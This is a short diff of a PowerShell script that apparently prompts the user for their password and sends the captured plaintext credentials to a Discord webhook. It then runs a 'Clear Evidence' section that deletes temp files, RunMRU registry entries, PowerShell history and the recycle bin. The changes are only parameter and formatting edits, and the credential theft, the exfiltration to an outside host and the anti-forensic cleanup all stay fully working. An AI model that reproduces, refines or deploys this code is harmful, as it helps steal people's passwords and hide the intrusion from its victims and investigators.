@@ -9,13 +9,10 @@ function Send-DiscordWebhook {
     param (
         [string]$WebhookUrl,
         [string]$Source,
-        [parameter(Mandatory=$false)]
-        [string]$Message,
-        [parameter(Mandatory=$false)]
         [string]$File
     )
 
-    if(-not ([string]::IsNullOrEmpty($Message))) {
+    if(-not ([string]::IsNullOrEmpty($File))) {
         $boundary = [System.Guid]::NewGuid().ToString()
         $LF = "`r`n"
         $fileName = [System.IO.Path]::GetFileName($File)
@@ -96,7 +93,7 @@ function Get-Creds {
         }
         
         else{
-            $creds = $cred.GetNetworkCredential() | fl
+            $creds = $cred.GetNetworkCredential() | Format-List
             return $creds
         }
     }
@@ -150,7 +147,7 @@ Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "PasswordPrompt" -File $
 
 # Clear Evidence
 
-Remove-Item -Path $env:TMP\* -File -ErrorAction SilentlyContinue
+Remove-Item -Path $env:TMP\* -ErrorAction SilentlyContinue
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
